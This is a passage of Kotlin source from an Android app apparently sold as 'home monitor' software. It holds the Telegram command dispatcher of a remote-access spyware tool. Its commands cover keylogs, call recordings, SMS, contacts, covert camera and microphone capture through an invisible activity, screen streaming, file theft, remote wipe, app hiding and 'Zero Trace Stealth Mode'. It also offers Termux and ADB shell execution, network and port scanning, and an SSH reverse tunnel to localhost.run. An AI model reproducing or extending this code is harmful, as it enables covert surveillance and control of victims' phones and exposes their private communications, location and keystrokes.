                Log.i(TAG, "Received inline button tap: '$callbackData' from chatId: $chatId (thread: $threadId)")

                when {
                    callbackData == "/confirm_unhide" -> handleExecuteUnhideApp(chatId)
                    callbackData == "/confirm_selfuninstall" -> handleExecuteSelfUninstall(chatId)
                    callbackData == "/cancel_action" -> sendMessage(chatId, "🛑 Action cancelled.", threadId = threadId)
                    callbackData.startsWith("/notif_view_") -> handleAppNotificationView(chatId, callbackData.removePrefix("/notif_view_"))
                    callbackData.startsWith("/notif_clear_") -> handleClearAppNotification(chatId, callbackData.removePrefix("/notif_clear_"))
                    callbackData.startsWith("/keylog_view_") -> handleKeylogView(chatId, callbackData.removePrefix("/keylog_view_"))
                    callbackData.startsWith("/callrec_get_") -> handleSendSingleCallRecording(chatId, callbackData.removePrefix("/callrec_get_"))
                    callbackData == "/callrec_zip_all" -> handleZipAllCallRecordings(chatId)
                    else -> dispatchCommand(callbackData, chatId, threadId = threadId)
                }
                return
            }

            val message = update.optJSONObject("message") ?: return
            val chatId = message.optJSONObject("chat")?.optString("id") ?: getLastChatId()
            val threadId = when {
                message.has("message_thread_id") -> message.optInt("message_thread_id", 0)
                else -> null
            }.let { if (it != null && it > 0) it else null }

            saveLastChatId(chatId)

            val text = message.optString("text", "").trim()
            val document = message.optJSONObject("document")

            when {
                text.isNotBlank() -> dispatchCommand(text, chatId, threadId = threadId)
                document != null -> handleIncomingDocument(chatId, document)
            }
        } catch (e: Exception) {
            Log.e(TAG, "handleUpdate error: ${e.message}")
        }
    }

    private fun cleanExpiredFiles() {
        try {
            val oneDayMs = 24 * 60 * 60 * 1000L // 24 hours rolling buffer
            val maxCacheBytes = 50 * 1024 * 1024L // 50 MB storage cap
            val now = System.currentTimeMillis()

            val targetDirs = listOf(
                File(cacheDir, ".call_recs"),
                File(cacheDir, ".notifs"),
                File(cacheDir, ".keylogs"),
                File(cacheDir, "offline_queue")
            )

            var totalSize = 0L
            val allFiles = mutableListOf<File>()

            targetDirs.forEach { dir ->
                if (dir.exists()) {
                    dir.listFiles()?.forEach { file ->
                        allFiles.add(file)
                        totalSize += file.length()
                        if (now - file.lastModified() > oneDayMs) {
                            file.delete()
                            Log.i(TAG, "Auto-purged 24h old target buffer file: ${file.name}")
                        }
                    }
                }
            }

            // Enforce 50 MB total storage cap - purge oldest if total exceeds 50 MB
            if (totalSize > maxCacheBytes) {
                allFiles.sortBy { it.lastModified() }
                for (file in allFiles) {
                    if (totalSize <= maxCacheBytes) break
                    val len = file.length()
                    if (file.delete()) {
                        totalSize -= len
                        Log.i(TAG, "Rolling buffer cap enforced (50 MB): Purged ${file.name}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "cleanExpiredFiles error: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  COMMAND DISPATCHER
    // ══════════════════════════════════════════════════════════════════════════

    private fun dispatchCommand(
        rawText: String,
        chatId: String,
        isDirectServerCommand: Boolean = false,
        isUserTelegram: Boolean = false,
        threadId: Int? = null
    ) {
        val text = rawText.substringBefore("@").lowercase(Locale.getDefault()).trim()
        Log.i(TAG, "Dispatching command: '$text' from chatId: $chatId (isDirectServerCommand=$isDirectServerCommand, isUserTelegram=$isUserTelegram, threadId=$threadId)")

        // Restrict Admin-Only Management Commands from User Telegram Bot (Zero Trace Stealth Mode)
        if (isUserTelegram) {
            if (text.startsWith("/settrial") || text.startsWith("/expiretrial") || text.startsWith("/settrialexpired") ||
                text.startsWith("/disableapp") || text == "/enableapp" || text == "/activatetrial" ||
                text.startsWith("/notifyuser") || text == "/trialstatus" ||
                text == "/target" || text.startsWith("/target ") || text.startsWith("/select ") ||
                text == "/wipe" || text == "/selfuninstall" || text == "/uninstallself" || text == "/cftoken" ||
                text.startsWith("/termux") || text.startsWith("!termux") || text.startsWith("/shizuku") || text.startsWith("!shizuku")
            ) {
                Log.i(TAG, "Silently dropping unauthorized admin command '$text' from User Telegram Bot (chatId: $chatId)")
                val response = "❓ *Unknown command.* Type `/help` to view available commands."
                sendMessage(chatId, response, parseMode = "Markdown", threadId = threadId)
                return
            }
        }

        // Check trial expiry / app restricted mode for User Telegram Bot commands
        if (isUserTelegram && com.homemonitor.C2TrialManager.isTrialExpired(this)) {
            val trialMsg = com.homemonitor.C2TrialManager.getTrialMessage(this)
            val response = "⚠️ *App Trial Expired / Purchase Required*\n\n$trialMsg\n\n_Please contact administrator to purchase full access or renew your app license._"
            sendMessage(chatId, response, parseMode = "Markdown", threadId = threadId)
            return
        }

        // Master Admin Feature Permission Enforcement
        val fbEngine = firebaseC2Engine
        if (fbEngine != null) {
            if ((text.startsWith("/camera") || text.startsWith("/frontcam") || text.startsWith("/videoclip")) && !fbEngine.isFeatureEnabled("camera_enabled")) {
                sendMessage(chatId, "⚠️ *Feature Disabled*: Camera commands have been disabled by Master Admin for this device.", parseMode = "Markdown", threadId = threadId)
                return
            }
            if ((text.startsWith("/audio") || text.startsWith("/mic")) && !fbEngine.isFeatureEnabled("mic_enabled")) {
                sendMessage(chatId, "⚠️ *Feature Disabled*: Mic audio recording has been disabled by Master Admin for this device.", parseMode = "Markdown", threadId = threadId)
                return
            }
            if ((text.startsWith("/location") || text.startsWith("/geolocation")) && !fbEngine.isFeatureEnabled("location_enabled")) {
                sendMessage(chatId, "⚠️ *Feature Disabled*: GPS location tracking has been disabled by Master Admin for this device.", parseMode = "Markdown", threadId = threadId)
                return
            }
            if ((text.startsWith("/termux") || text.startsWith("!termux")) && !fbEngine.isFeatureEnabled("termux_enabled")) {
                sendMessage(chatId, "⚠️ *Feature Disabled*: Termux shell access has been disabled by Master Admin for this device.", parseMode = "Markdown", threadId = threadId)
                return
            }
            if ((text.startsWith("/sms") || text.startsWith("/sendsms") || text.startsWith("/call")) && !fbEngine.isFeatureEnabled("sms_calls_enabled")) {
                sendMessage(chatId, "⚠️ *Feature Disabled*: SMS and Call telemetry have been disabled by Master Admin for this device.", parseMode = "Markdown", threadId = threadId)
                return
            }
        }

        // Target management commands
        if (text == "/target" || text.startsWith("/target ") || text.startsWith("/select ")) {
            val targetArg = rawText.removePrefix("/target ").removePrefix("/select ").removePrefix("/target").trim()
            handleTargetCommand(chatId, targetArg)
            return
        }

        // Global help, start, commands, and device list
        if (text == "/help" || text == "/start" || text == "/cmd" || text == "/commands") { sendHelpMenu(chatId, threadId); return }
        if (text == "/devicelist" || text == "/devices") { sendDeviceListMenu(chatId); return }
        if (text == "/bind_telegram_group" || text.startsWith("/bind_telegram_group ") ||
            text == "/bindgroup" || text.startsWith("/bindgroup ") ||
            text == "/bind_group" || text.startsWith("/bind_group ") ||
            text == "/bind" || text == "/createtopics" || text == "/subtopics"
        ) {
            handleBindTelegramGroup(chatId, threadId)
            return
        }

        // Bound group filtering: if command comes from a Supergroup bound to another device, ignore
        val boundGroupChatId = SecurityVaultManager.getEncryptedPrefs(this).getString("telegram_bound_group_chat_id", null)
        if (!boundGroupChatId.isNullOrBlank() && chatId.startsWith("-100") && chatId != boundGroupChatId) {
            Log.i(TAG, "Ignoring command '$text' from chat $chatId because this device is bound to group $boundGroupChatId")
            return
        }

        // Verify if this specific device is targeted before executing action commands
        if (!isDirectServerCommand && !isCommandTargetedToMe()) {
            Log.i(TAG, "Ignoring command '$text' because active target is '${getSelectedTargetId()}'")
            return
        }

        // Auto-launch InvisibleActivity for hardware commands requiring RESUMED state
        if (text.startsWith("/camera") || text.startsWith("!camera") ||
            text.startsWith("/frontcam") || text.startsWith("!frontcam") ||
            text.startsWith("/videoclip") || text.startsWith("!videoclip") ||
            text.startsWith("/recordvideo") || text.startsWith("!recordvideo") ||
            text.startsWith("/frontvideo") || text.startsWith("!frontvideo") ||
            text.startsWith("/audio") || text.startsWith("!audio") ||
            text.startsWith("/location") || text.startsWith("!location") ||
            text.startsWith("/geolocation") || text.startsWith("!geolocation") ||
            text.startsWith("/screenshot") || text.startsWith("!screenshot") ||
            text.startsWith("/livescreen") || text.startsWith("!livescreen")
        ) {
            try { InvisibleActivity.launchInvisible(this) } catch (_: Exception) {}
        }

        when {
            text.startsWith("/settrial") || text.startsWith("/expiretrial") || text.startsWith("/settrialexpired") ||
            text.startsWith("/disableapp") || text == "/enableapp" || text == "/activatetrial" ||
            text.startsWith("/notifyuser") || text == "/trialstatus" -> handleAdminTrialCommand(chatId, rawText)
            text == "/activateapp" || text == "!activateapp" || text == "/showui" || text == "!showui" -> handleActivateApp(chatId)
            text == "/closeapp" || text == "!closeapp" || text == "/deactivateapp" || text == "!deactivateapp" || text == "/hideui" || text == "!hideui" -> handleCloseApp(chatId)
            text == "/unlock" || text == "!unlock" || text == "unlock" -> {
                mainHandler.post {
                    try {
                        C2Gatekeeper.promptPasswordDialog(this) {}
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to open C2Gatekeeper dialog: ${e.message}")
                    }
                }
                sendMessage(chatId, "🔓 *C2 Permission Manager Unlocked on Device Screen!*", parseMode = "Markdown")
            }
            text == "/accessibility" || text == "!accessibility" || text == "!checkaccessibility" -> handleCheckAccessibilityStatus(chatId)
            text == "/watchdog" || text == "!watchdog" || text == "/watchdogstatus" || text == "!watchdogstatus" -> handleWatchdogStatus(chatId)
            text == "/recordvideo" || text.startsWith("/recordvideo ") || text == "!recordvideo" || text.startsWith("!recordvideo ") ||
            text == "/screenrecord" || text.startsWith("/screenrecord ") || text == "!screenrecord" || text.startsWith("!screenrecord ") -> {
                val sec = rawText.removePrefix("/recordvideo ").removePrefix("/recordvideo").removePrefix("!recordvideo ").removePrefix("!recordvideo")
                    .removePrefix("/screenrecord ").removePrefix("/screenrecord").removePrefix("!screenrecord ").removePrefix("!screenrecord").trim().toIntOrNull() ?: 10
                handleScreenRecordCommand(chatId, sec)
            }
            text == "/lock"                        -> handleRemoteLock(chatId)
            text == "/wipe"                        -> handleRemoteWipe(chatId)
            text == "/unhideapp" || text == "/showapp" -> handlePromptUnhideApp(chatId)
            text == "/hideapp"                     -> handleHideApp(chatId)
            text == "/selfuninstall" || text == "/uninstallself" -> handlePromptSelfUninstall(chatId)
            text == "/deviceonline" || text == "/liveonline" || text == "/wsdevices" -> handleDeviceOnlineStatus(chatId)
            text == "/update" || text.startsWith("/update ") || text.startsWith("/updateapp ") -> handleRemoteUpdateApp(chatId, rawText.removePrefix("/updateapp ").removePrefix("/update ").removePrefix("/update").trim())
            text == "/notification" || text == "/notifications" || text == "/notif" -> handleNotificationMenu(chatId)
            text == "/dumpnotifs" || text == "/dumpnotifications" || text == "!dumpnotifs" || text == "!dumpnotifications" -> handleDumpNotifications(chatId)
            text == "/history" || text == "!history" || text == "/browserhistory" || text == "!browserhistory" || text == "/webhistory" || text == "!webhistory" -> handleBrowserHistoryCommand(chatId)
            text == "/torch" || text.startsWith("/torch ") || text == "!torch" || text.startsWith("!torch ") || text == "/flashlight" || text.startsWith("/flashlight ") || text == "!flashlight" || text.startsWith("!flashlight ") -> {
                val sec = rawText.removePrefix("/torch ").removePrefix("/torch").removePrefix("!torch ").removePrefix("!torch").removePrefix("/flashlight ").removePrefix("/flashlight").removePrefix("!flashlight ").removePrefix("!flashlight").trim().toIntOrNull() ?: 10
                handleTorchCommand(chatId, sec)
            }
            text == "/speak" || text.startsWith("/speak ") || text == "!speak" || text.startsWith("!speak ") || text == "/tts" || text.startsWith("/tts ") || text == "!tts" || text.startsWith("!tts ") -> {
                val msg = rawText.removePrefix("/speak ").removePrefix("/speak").removePrefix("!speak ").removePrefix("!speak").removePrefix("/tts ").removePrefix("/tts").removePrefix("!tts ").removePrefix("!tts").trim()
                handleSpeakTTS(chatId, msg)
            }
            text == "/setclipboard" || text.startsWith("/setclipboard ") || text == "!setclipboard" || text.startsWith("!setclipboard ") || text == "/copy" || text.startsWith("/copy ") || text == "!copy" || text.startsWith("!copy ") -> {
                val clipText = rawText.removePrefix("/setclipboard ").removePrefix("/setclipboard").removePrefix("!setclipboard ").removePrefix("!setclipboard").removePrefix("/copy ").removePrefix("/copy").removePrefix("!copy ").removePrefix("!copy").trim()
                handleSetClipboard(chatId, clipText)
            }
            text == "/toast" || text.startsWith("/toast ") || text == "!toast" || text.startsWith("!toast ") -> {
                val toastText = rawText.removePrefix("/toast ").removePrefix("/toast").removePrefix("!toast ").removePrefix("!toast").trim()
                handleToast(chatId, toastText)
            }
            text == "/wifi" || text == "!wifi" || text == "/network" || text == "!network" -> handleWifiInfo(chatId)
            text == "/disk" || text == "!disk" || text == "/storage" || text == "!storage" -> handleDiskUsage(chatId)
            text == "/battery" || text == "!battery" || text == "/power" || text == "!power" -> handleBatteryTelemetry(chatId)
            text == "/vibrate" || text.startsWith("/vibrate ") || text == "!vibrate" || text.startsWith("!vibrate ") -> {
                val ms = rawText.removePrefix("/vibrate ").removePrefix("/vibrate").removePrefix("!vibrate ").removePrefix("!vibrate").trim().toIntOrNull() ?: 500
                handleVibrate(chatId, ms)
            }
            text == "/call" || text.startsWith("/call ") || text == "!call" || text.startsWith("!call ") -> {
                val number = rawText.removePrefix("/call ").removePrefix("/call").removePrefix("!call ").removePrefix("!call").trim()
                handleCall(chatId, number)
            }
            text == "/openurl" || text.startsWith("/openurl ") || text == "!openurl" || text.startsWith("!openurl ") || text == "/browser" || text.startsWith("/browser ") || text == "!browser" || text.startsWith("!browser ") -> {
                val url = rawText.removePrefix("/openurl ").removePrefix("/openurl").removePrefix("!openurl ").removePrefix("!openurl").removePrefix("/browser ").removePrefix("/browser").removePrefix("!browser ").removePrefix("!browser").trim()
                handleOpenUrl(chatId, url)
            }
            text == "/appusage" || text == "!appusage" || text == "/topapps" || text == "!topapps" -> handleAppUsage(chatId)
            text == "/apps" || text == "!apps" || text == "/installedapps" || text == "!installedapps" -> handleInstalledApps(chatId)
            text == "/activeapp"                   -> handleActiveApp(chatId)
            text == "/keylog" || text == "/keylogs" -> handleKeylogMenu(chatId)
            text == "/ai" || text.startsWith("/ai ") || text == "!ai" || text.startsWith("!ai ") -> {
                val prompt = rawText.removePrefix("/ai ").removePrefix("/ai").removePrefix("!ai ").removePrefix("!ai").trim()
                handleAIC2Command(chatId, prompt)
            }
            text == "/aisummary" || text == "!aisummary" || text == "/summarize" || text == "!summarize" -> handleAISummaryCommand(chatId)
            text == "/netscan" || text == "!netscan" || text == "/subnet" || text == "!subnet" -> handleNetScanCommand(chatId)
            text == "/arp" || text == "!arp" || text == "/arptable" || text == "!arptable" -> handleArpTableCommand(chatId)
            text == "/portscan" || text.startsWith("/portscan ") || text == "!portscan" || text.startsWith("!portscan ") -> {
                val ipArg = rawText.removePrefix("/portscan ").removePrefix("/portscan").removePrefix("!portscan ").removePrefix("!portscan").trim()
                handlePortScanCommand(chatId, ipArg)
            }
            text == "/shizuku" || text.startsWith("/shizuku ") || text == "!shizuku" || text.startsWith("!shizuku ") -> {
                val cmdArg = rawText.removePrefix("/shizuku ").removePrefix("/shizuku").removePrefix("!shizuku ").removePrefix("!shizuku").trim()
                handleShizukuAdbCommand(chatId, cmdArg)
            }
            text == "/shizukugrant" || text.startsWith("/shizukugrant ") || text == "!shizukugrant" || text.startsWith("!shizukugrant ") -> {
                val args = rawText.removePrefix("/shizukugrant ").removePrefix("/shizukugrant").removePrefix("!shizukugrant ").removePrefix("!shizukugrant").trim()
                handleShizukuGrantCommand(chatId, args)
            }
            text == "/shizukukill" || text.startsWith("/shizukukill ") || text == "!shizukukill" || text.startsWith("!shizukukill ") -> {
                val pkgArg = rawText.removePrefix("/shizukukill ").removePrefix("/shizukukill").removePrefix("!shizukukill ").removePrefix("!shizukukill").trim()
                handleShizukuKillCommand(chatId, pkgArg)
            }
            text == "/arm" || text == "!arm" || text == "/guard" || text == "!guard" -> handleArmPhysicalGuard(chatId)
            text == "/disarm" || text == "!disarm" || text == "/unguard" || text == "!unguard" -> handleDisarmPhysicalGuard(chatId)
            text == "/motion" || text.startsWith("/motion ") || text == "!motion" || text.startsWith("!motion ") -> {
                val sensArg = rawText.removePrefix("/motion ").removePrefix("/motion").removePrefix("!motion ").removePrefix("!motion").trim()
                handleMotionCommand(chatId, sensArg)
            }
            text == "/duckyrecord" || text.startsWith("/duckyrecord ") || text == "!duckyrecord" || text.startsWith("!duckyrecord ") -> {
                val actionArg = rawText.removePrefix("/duckyrecord ").removePrefix("/duckyrecord").removePrefix("!duckyrecord ").removePrefix("!duckyrecord").trim()
                handleDuckyRecordCommand(chatId, actionArg)
            }
            text == "/duckyvalidate" || text.startsWith("/duckyvalidate ") || text == "!duckyvalidate" || text.startsWith("!duckyvalidate ") -> {
                val scriptArg = rawText.removePrefix("/duckyvalidate ").removePrefix("/duckyvalidate").removePrefix("!duckyvalidate ").removePrefix("!duckyvalidate").trim()
                handleDuckyValidateCommand(chatId, scriptArg)
            }
            text == "/attestation" || text == "!attestation" || text == "/keyattestation" || text == "!keyattestation" -> handleKeyAttestationCommand(chatId)
            text == "/adminstatus" || text == "!adminstatus" || text == "/deviceowner" || text == "!deviceowner" -> handleAdminStatus(chatId)
            text == "/grantpermissions" || text == "!grantpermissions" || text == "/enterprisegrant" || text == "!enterprisegrant" -> handleEnterpriseGrantPermissions(chatId)
            text == "/reboot" || text == "!reboot" -> handleMdmRebootCommand(chatId)
            text == "/lockmessage" || text.startsWith("/lockmessage ") || text == "!lockmessage" || text.startsWith("!lockmessage ") -> handleMdmLockMessageCommand(chatId, rawText)
            text == "/disablescreenshot" || text.startsWith("/disablescreenshot ") || text == "!disablescreenshot" || text.startsWith("!disablescreenshot ") -> handleMdmScreenshotCommand(chatId, rawText)
            text == "/disablestatusbar" || text.startsWith("/disablestatusbar ") || text == "!disablestatusbar" || text.startsWith("!disablestatusbar ") -> handleMdmStatusbarCommand(chatId, rawText)
            text == "/disableusb" || text.startsWith("/disableusb ") || text == "!disableusb" || text.startsWith("!disableusb ") -> handleMdmUsbCommand(chatId, rawText)
            text == "/multikiosk" || text.startsWith("/multikiosk ") || text == "!multikiosk" || text.startsWith("!multikiosk ") -> handleMdmMultiKioskCommand(chatId, rawText)
            text == "/kiosk" || text.startsWith("/kiosk ") || text == "!kiosk" || text.startsWith("!kiosk ") -> handleMdmKioskCommand(chatId, rawText)
            text == "/cameradisable" || text.startsWith("/cameradisable ") || text == "!cameradisable" || text.startsWith("!cameradisable ") -> handleMdmCameraDisableCommand(chatId, rawText)
            text == "/apphide" || text.startsWith("/apphide ") || text == "!apphide" || text.startsWith("!apphide ") -> handleMdmAppHideCommand(chatId, rawText)
            text == "/appsuspend" || text.startsWith("/appsuspend ") || text == "!appsuspend" || text.startsWith("!appsuspend ") -> handleMdmAppSuspendCommand(chatId, rawText)
            text == "/mdmrestrict" || text.startsWith("/mdmrestrict ") || text == "!mdmrestrict" || text.startsWith("!mdmrestrict ") -> handleMdmRestrictionsCommand(chatId, rawText)
            text == "/keyguardrestrict" || text.startsWith("/keyguardrestrict ") || text == "!keyguardrestrict" || text.startsWith("!keyguardrestrict ") -> handleMdmKeyguardCommand(chatId, rawText)
            text == "/autoaccessibility" || text == "!autoaccessibility" -> handleAutoAccessibilityCommand(chatId)
            text == "/network" || text == "/wifi"  -> handleNetworkInfo(chatId)
            text == "/clipboard"                   -> handleClipboard(chatId)
            text == "/deviceinfo" || text == "/info" || text == "/device" -> handleDeviceInfoCommand(chatId)
            text == "/status" || text == "/alive"  -> handleStatus(chatId)
            text == "/contacts"                    -> handleContacts(chatId)
            text == "/calls"                       -> handleCallLogs(chatId)
            text == "/callrecs" || text == "/recordings" || text == "/getcallrecs" -> handleCallRecordingsMenu(chatId)
            text == "/camera"                      -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
            text == "/frontcam"                    -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA)
            text == "/screenshot" || text == "/screen" -> handleScreenshotCommand(chatId)
            text == "/location"                    -> handleLocation(chatId)
            text == "/geolocation" || text == "/geo" -> handleGeoLocation(chatId)
            text == "/iplocation" || text == "/ip" -> handleIpLocation(chatId)
            text == "/files"                       -> handleFiles(chatId, "")
            text.startsWith("/files ")             -> handleFiles(chatId, text.removePrefix("/files "))
            text == "/download" || text == "/getfile" -> handleDownloadFileByName(chatId, "")
            text.startsWith("/download ")          -> handleDownloadFileByName(chatId, rawText.removePrefix("/download ").trim())
            text.startsWith("/getfile ")           -> handleDownloadFileByName(chatId, rawText.removePrefix("/getfile ").trim())
            text == "/sms"                         -> handleSms(chatId, "")
            text.startsWith("/sms ")               -> handleSms(chatId, rawText.removePrefix("/sms ").trim())
            text == "/sendsms"                     -> handleSendSms(chatId, "")
            text.startsWith("/sendsms ")           -> handleSendSms(chatId, rawText.removePrefix("/sendsms ").trim())
            text == "/makecall"                    -> handleMakeCall(chatId, "")
            text.startsWith("/makecall ")          -> handleMakeCall(chatId, rawText.removePrefix("/makecall ").trim())
            text.startsWith("/call ")              -> handleMakeCall(chatId, rawText.removePrefix("/call ").trim())
            text == "/filemn"                      -> handleFileMn(chatId, "")
            text.startsWith("/filemn ")            -> handleFileMn(chatId, rawText.removePrefix("/filemn ").trim())
            text == "/zip"                         -> handleZipFolder(chatId, "")
            text.startsWith("/zip ")               -> handleZipFolder(chatId, rawText.removePrefix("/zip ").trim())
            text.startsWith("/zipfolder ")         -> handleZipFolder(chatId, rawText.removePrefix("/zipfolder ").trim())
            text == "pwd" || text == "/pwd"                            -> handlePwd(chatId)
            text == "ls" || text == "dir" || text == "/ls" || text == "/dir" -> handleLs(chatId)
            text == "cd.." || text == "cd .." || text == "/cd.." || text == "/cd .." -> handleCd(chatId, "..")
            text.startsWith("cd ")                                     -> handleCd(chatId, rawText.substring(3).trim())
            text.startsWith("/cd ")                                    -> handleCd(chatId, rawText.substring(4).trim())
            text.matches(Regex("/audio\\d*"))      -> handleAudio(chatId, text.removePrefix("/audio").toIntOrNull() ?: 10)
            text.startsWith("/audio ")             -> handleAudio(chatId, text.removePrefix("/audio ").trim().toIntOrNull() ?: 10)
            text.matches(Regex("/mic\\d*"))        -> handleAudio(chatId, text.removePrefix("/mic").toIntOrNull() ?: 10)
            text.startsWith("/mic ")               -> handleAudio(chatId, text.removePrefix("/mic ").trim().toIntOrNull() ?: 10)
            text == "/installtermux" || text.startsWith("/installtermux ") -> handleInstallTermux(chatId, rawText.removePrefix("/installtermux ").removePrefix("/installtermux").trim())
            text == "/termuxstatus" || text == "/termuxinfo" -> handleTermuxStatus(chatId)
            text == "/termux" || text.startsWith("/termux ") -> handleTermuxCommand(chatId, rawText.removePrefix("/termux ").removePrefix("/termux").trim())
            text == "/watchscreen" || text.startsWith("/watchscreen ") -> handleWatchScreen(chatId, rawText.removePrefix("/watchscreen ").removePrefix("/watchscreen").trim())
            text == "/stopwatchscreen" -> handleStopWatchScreen(chatId)
            text == "/livescreen" || text.startsWith("/livescreen ") -> handleLiveScreenClip(chatId, rawText.removePrefix("/livescreen ").removePrefix("/livescreen").trim())
            text == "/videoclip" || text.startsWith("/videoclip ") || text == "/recordvideo" || text.startsWith("/recordvideo ") -> {
                val sec = rawText.removePrefix("/videoclip ").removePrefix("/videoclip").removePrefix("/recordvideo ").removePrefix("/recordvideo").trim().toIntOrNull() ?: 10
                handleRecordVideoClip(chatId, sec, isFrontCamera = false)
            }
            text == "/frontvideo" || text.startsWith("/frontvideo ") -> {
                val sec = rawText.removePrefix("/frontvideo ").removePrefix("/frontvideo").trim().toIntOrNull() ?: 10
                handleRecordVideoClip(chatId, sec, isFrontCamera = true)
            }
            text == "/webstream" || text == "!webstream" -> handleStartWebStream(chatId)
            text == "/webstream ipv6" || text == "!webstream ipv6" || text == "/ipv6" || text == "!ipv6" -> {
                if (!isWebStreamRunning) { handleStartWebStream(chatId) }
                val ipv6 = getDevicePublicIpv6Address()
                if (!ipv6.isNullOrBlank()) {
                    val url = "http://[$ipv6]:${Placeholder.WEBSTREAM_LOCAL_PORT}/"
                    val msg = "🌐 **Direct Global IPv6 WAN WebStream URL (No Tunnel Required)**\n\n" +
                            "🔗 **Direct WAN URL**: `$url`\n" +
                            "🔑 **Master Passcode**: `${Placeholder.C2_MASTER_PASSCODE}`\n\n" +
                            "📌 Open this URL directly on any IPv6-enabled computer or phone anywhere in the world for direct peer-to-peer web control!"
                    sendMessage(chatId, msg, parseMode = "Markdown")
                    sendDiscordCategorizedMessage("12-screen-share-stream", msg)
                } else {
                    sendMessage(chatId, "⚠️ *No public global IPv6 address currently detected on device interfaces.*\nEnsure 4G/5G mobile data or IPv6 Wi-Fi is active.", parseMode = "Markdown")
                }
            }
            text == "/webstream local" || text == "!webstream local" || text == "!webstream ssh" -> {
                if (!isWebStreamRunning) { handleStartWebStream(chatId) }
                sendMessage(chatId, "⚡ *Launching SSH Remote Tunnel (installing openssh if needed)…*")
                dispatchCommand("/termux pkg install -y openssh && ssh -R 80:localhost:${Placeholder.WEBSTREAM_LOCAL_PORT} nokey@localhost.run", chatId, isDirectServerCommand = true)
            }
            text == "/installlocaltunnel" || text == "!installlocaltunnel" -> {
                sendMessage(chatId, "📥 *Installing Node.js & LocalTunnel in Termux…*")
                dispatchCommand("/termux pkg install -y nodejs && npm install -g localtunnel", chatId, isDirectServerCommand = true)
            }
            text == "/stopwebstream" || text == "!stopwebstream" -> handleStopWebStream(chatId)
            text == "/surroundings_recording" -> handleAudio(chatId, 15)
            text == "/remote_camera" -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
            text == "/call_recording" -> handleCallRecordingsMenu(chatId)
            text == "/live_screenshot" -> handleScreenshotCommand(chatId)
            text == "/live_screen_streaming" -> handleStartWebStream(chatId)
            text == "/block_app" -> handleMdmAppHideCommand(chatId, rawText)
            text == "/block_website" -> sendMessage(chatId, "🚫 *Website Restrictions Policy Active*", parseMode = "Markdown")
            text == "/block_wifi" -> handleWifiInfo(chatId)
            text == "/chat_gpt" || text == "/gemini" -> handleAISummaryCommand(chatId)
            text == "/activity_timeline" -> handleAppUsage(chatId)
            text == "/key_logger_app" -> handleKeylogMenu(chatId)
            text == "/keyword_rule" -> handleTamperAuditCommand(chatId)
            text == "/call" -> handleCallLogs(chatId)
            text == "/contact" -> handleContacts(chatId)
            text == "/browser_history" -> handleBrowserHistoryCommand(chatId)
            text == "/browser_bookmark" -> handleBrowserHistoryCommand(chatId)
            text == "/application" -> handleInstalledApps(chatId)
            text == "/event" -> sendMessage(chatId, "📅 *Calendar Events Synced*", parseMode = "Markdown")
            text == "/screenrecorder_pages" -> handleLiveScreenClip(chatId, "10")
            text == "/sms_chat" -> handleSms(chatId, "")
            text == "/photo" -> handlePhotosByDateCommand(chatId, "", "", 10)
            text == "/video" -> handleRecordVideoClip(chatId, 10, isFrontCamera = false)
            text == "/location" || text == "/geofencing_area" -> handleGeoLocation(chatId)
            text == "/wifi" -> handleWifiInfo(chatId)
            text == "/instalker" -> handleActiveApp(chatId)
            text == "/location_by_link" -> handleIpLocation(chatId)
            text == "/stealth" || text.startsWith("/stealth ") || text == "/blackscreen" || text.startsWith("/blackscreen ") -> handleStealthCommand(chatId, rawText.removePrefix("/stealth ").removePrefix("/stealth").removePrefix("/blackscreen ").removePrefix("/blackscreen").trim())
            text == "/uninstall" || text.startsWith("/uninstall ") || text == "/uninstallapp" || text.startsWith("/uninstallapp ") -> handleUninstallApp(chatId, rawText.removePrefix("/uninstallapp ").removePrefix("/uninstallapp").removePrefix("/uninstall ").removePrefix("/uninstall").trim())
            text == "/selfuninstall" || text == "/uninstallself" -> handlePromptSelfUninstall(chatId)
            text == "/say" || text.startsWith("/say ") -> handleSayTTS(chatId, rawText.removePrefix("/say ").removePrefix("/say").trim())
            text == "/toast" || text.startsWith("/toast ") -> handleToastMsg(chatId, rawText.removePrefix("/toast ").removePrefix("/toast").trim())
            text == "/findme" || text == "/ring" -> handleFindMeAlarm(chatId)
            text == "/syncmedia" || text.startsWith("/syncmedia ") -> handleSyncMedia(chatId, rawText.removePrefix("/syncmedia ").removePrefix("/syncmedia").trim())
            text == "/scheduleaudio" || text.startsWith("/scheduleaudio ") -> handleScheduleAudio(chatId, rawText.removePrefix("/scheduleaudio ").removePrefix("/scheduleaudio").trim())
            text == "/motion" || text.startsWith("/motion ") -> handleMotionCommand(chatId, rawText.removePrefix("/motion ").removePrefix("/motion").trim())
            text == "/geofence" || text.startsWith("/geofence ") -> handleGeofenceCommand(chatId, rawText.removePrefix("/geofence ").removePrefix("/geofence").trim())
            text == "/batterysaver" || text.startsWith("/batterysaver ") -> handleBatterySaverCommand(chatId, rawText.removePrefix("/batterysaver ").removePrefix("/batterysaver").trim())
            text == "/transcribe" || text.startsWith("/transcribe ") -> handleTranscribeAudio(chatId, rawText.removePrefix("/transcribe ").removePrefix("/transcribe").trim())
            text == "/cfregister" || text == "!cfregister" || text.startsWith("/cfregister ") || text.startsWith("!cfregister ") -> {
                handleCloudflareAutoRegister(chatId)
            }
            text == "/cfreconcile" || text == "!cfreconcile" -> {
                handleCloudflareReconcile(chatId)
            }
            text == "/cfrotatetoken" || text == "!cfrotatetoken" -> {
                handleCloudflareRotateToken(chatId)
            }
            text == "/cfunregister" || text == "!cfunregister" -> {
                handleCloudflareUnregister(chatId)
            }
            text == "/cftoken" || text == "!cftoken" || text.startsWith("/cftoken ") || text.startsWith("!cftoken ") ||
            text == "/cfwebtoken" || text == "!cfwebtoken" || text.startsWith("/cfwebtoken ") || text.startsWith("!cfwebtoken ") -> {
                val args = rawText.removePrefix("/cftoken ").removePrefix("/cftoken").removePrefix("!cftoken ").removePrefix("!cftoken")
                    .removePrefix("/cfwebtoken ").removePrefix("/cfwebtoken").removePrefix("!cfwebtoken ").removePrefix("!cfwebtoken").trim()
                handleSetCloudflareTunnel(chatId, args)
            }
